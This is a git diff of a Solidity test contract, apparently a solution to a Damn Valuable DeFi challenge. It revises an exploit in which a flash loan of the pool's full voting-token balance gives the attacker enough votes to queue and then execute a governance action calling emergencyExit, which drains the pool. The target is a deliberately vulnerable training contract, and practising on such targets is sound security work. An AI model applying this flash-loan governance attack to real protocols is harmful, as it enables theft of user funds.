@@ -15,6 +15,7 @@ contract Attacker is IERC3156FlashBorrower, Test {
     DamnValuableVotes public votingToken;
 
     address public recovery;
+    uint256 public actionId;
     bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
     uint256 constant TOKENS_IN_POOL = 1_500_000e18;
 
@@ -29,7 +30,10 @@ contract Attacker is IERC3156FlashBorrower, Test {
 
     function attack(address token) external{
         pool.flashLoan(IERC3156FlashBorrower(this),address(token),TOKENS_IN_POOL,"");
-        console.log(votingToken.balanceOf(address(this)));
+        // console.log(votingToken.balanceOf(address(this)));
+
+        vm.warp(block.timestamp + governance.getActionDelay() + 1);
+        governance.executeAction(actionId);
     }
 
     function onFlashLoan(
@@ -40,12 +44,9 @@ contract Attacker is IERC3156FlashBorrower, Test {
         bytes calldata data
     ) external returns (bytes32){
         votingToken.delegate(address(this));
-        uint256 actionId = governance.queueAction(address(pool),0,abi.encodeWithSelector(pool.emergencyExit.selector, recovery));
+        actionId = governance.queueAction(address(pool),0,abi.encodeWithSelector(pool.emergencyExit.selector, recovery));
 
-        votingToken.approve(address(this),TOKENS_IN_POOL);
-        votingToken.transfer(address(pool),TOKENS_IN_POOL);
-        vm.warp(block.timestamp + governance.getActionDelay() + 1);
-        governance.executeAction(actionId);
+        votingToken.approve(address(pool),TOKENS_IN_POOL);
 
         return CALLBACK_SUCCESS;
         
